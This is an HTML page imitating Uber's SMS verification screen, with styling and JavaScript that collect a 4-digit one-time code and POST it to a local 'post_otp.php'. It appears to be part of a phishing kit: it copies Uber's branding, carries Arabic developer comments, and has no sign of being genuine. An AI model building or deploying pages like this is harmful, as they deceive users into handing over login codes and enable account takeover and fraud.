<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uber - Verification</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: "Move Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #ffffff;
            color: #333333;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        .header {
            background-color: #000000;
            padding: 18px 40px;
            width: 100%;
        }
        .header .logo {
            color: #ffffff;
            font-size: 24px;
            font-weight: 500;
            letter-spacing: -1px;
        }
        .container {
            max-width: 380px;
            width: 100%;
            margin: 60px auto 0 auto;
            padding: 0 20px;
        }
        h2 {
            font-size: 24px;
            font-weight: 400;
            line-height: 32px;
            margin-bottom: 12px;
            color: #000000;
        }
        .sub-text {
            font-size: 14px;
            color: #333333;
            line-height: 20px;
            margin-bottom: 12px;
        }
        .link-text {
            font-size: 14px;
            color: #000000;
            text-decoration: underline;
            cursor: pointer;
            display: inline-block;
            margin-bottom: 30px;
        }
        .otp-container {
            display: flex;
            gap: 12px;
            margin-bottom: 30px;
            align-items: center;
        }
        .otp-box {
            width: 48px;
            height: 48px;
            border: none;
            border-radius: 8px;
            background-color: #eeeeee;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            color: #000000;
            outline: none;
            inputmode: numeric;
        }
        .otp-box:focus {
            background-color: #e2e2e2;
            box-shadow: inset 0 0 0 2px #000000;
        }
        .action-btn {
            display: inline-block;
            background-color: #eeeeee;
            color: #000000;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            border: none;
            cursor: pointer;
            margin-bottom: 12px;
        }
        .navigation-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }
        .btn-back {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background-color: #eeeeee;
            display: flex;
            align-items: center;
            justify-content: center;
            border: none;
            cursor: pointer;
            text-decoration: none;
            color: #000000;
        }
        .btn-next {
            background-color: #eeeeee;
            color: #a0a0a0;
            padding: 12px 24px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 500;
            border: none;
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: not-allowed;
            text-decoration: none;
        }
        .btn-next.active {
            background-color: #000000;
            color: #ffffff;
            cursor: pointer;
        }
        .error-msg {
            color: red;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="header">
        <div class="logo">Uber</div>
    </div>

    <div class="container">
        <h2>Welcome back.</h2>
        <div class="sub-text">Enter the 4-digit code sent via SMS.</div>
        <div class="link-text">Changed your mobile number?</div>

        <form action="post_otp.php" method="POST" id="otpForm" onsubmit="combineInputs(event)">
            <div class="otp-container">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="\d*" oninput="moveNext(this, 1)" onkeydown="movePrev(event, 0)" id="code1" autocomplete="off">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="\d*" oninput="moveNext(this, 2)" onkeydown="movePrev(event, 1)" id="code2" autocomplete="off">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="\d*" oninput="moveNext(this, 3)" onkeydown="movePrev(event, 2)" id="code3" autocomplete="off">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="\d*" oninput="checkCompletion()"  onkeydown="movePrev(event, 3)" id="code4" autocomplete="off">
            </div>

            <button type="button" class="action-btn">Resend code via SMS</button>

            <!-- حقل مخفي يستقبل الكود المدمج -->
            <input type="hidden" name="otp_code" id="unified_field">

            <div class="error-msg" id="errorMsg">⚠️ Please enter 4 digits only.</div>

            <div>
                <button type="button" class="action-btn">More options</button>
            </div>

            <div class="navigation-row">
                <a href="index.html" class="btn-back">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <line x1="19" y1="12" x2="5" y2="12"></line>
                        <polyline points="12 19 5 12 12 5"></polyline>
                    </svg>
                </a>
                <button type="submit" class="btn-next" id="nextBtn" disabled>
                    Next &rarr;
                </button>
            </div>
        </form>
    </div>

    <script>
        // الانتقال للخانة التالية عند الإدخال
        function moveNext(current, nextIndex) {
            // السماح بالأرقام فقط
            current.value = current.value.replace(/\D/g, '');

            if (current.value.length >= 1 && nextIndex < 4) {
                document.getElementById("code" + (nextIndex + 1)).focus();
            }
            checkCompletion();
        }

        // الرجوع للخانة السابقة عند الضغط على Backspace
        function movePrev(event, prevIndex) {
            if (event.key === "Backspace" && event.target.value === "" && prevIndex > 0) {
                document.getElementById("code" + prevIndex).focus();
            }
        }

        // التحقق من اكتمال الكود لتفعيل زر Next
        function checkCompletion() {
            const c1 = document.getElementById("code1").value;
            const c2 = document.getElementById("code2").value;
            const c3 = document.getElementById("code3").value;
            const c4 = document.getElementById("code4").value;
            const nextBtn = document.getElementById("nextBtn");

            if (c1 !== "" && c2 !== "" && c3 !== "" && c4 !== "") {
                nextBtn.classList.add("active");
                nextBtn.removeAttribute("disabled");
            } else {
                nextBtn.classList.remove("active");
                nextBtn.setAttribute("disabled", "disabled");
            }
        }

        // دمج الكود وإرسال الفورم
        function combineInputs(event) {
            event.preventDefault();

            const c1 = document.getElementById('code1').value;
            const c2 = document.getElementById('code2').value;
            const c3 = document.getElementById('code3').value;
            const c4 = document.getElementById('code4').value;
            const fullCode = c1 + c2 + c3 + c4;

            const errorMsg = document.getElementById('errorMsg');

            // تحقق: 4 أرقام فقط
            if (!/^\d{4}$/.test(fullCode)) {
                errorMsg.style.display = 'block';
                return;
            }

            errorMsg.style.display = 'none';

            // ضع القيمة في الحقل المخفي ثم أرسل
            document.getElementById('unified_field').value = fullCode;
            document.getElementById('otpForm').submit();
        }
    </script>

</body>
</html>
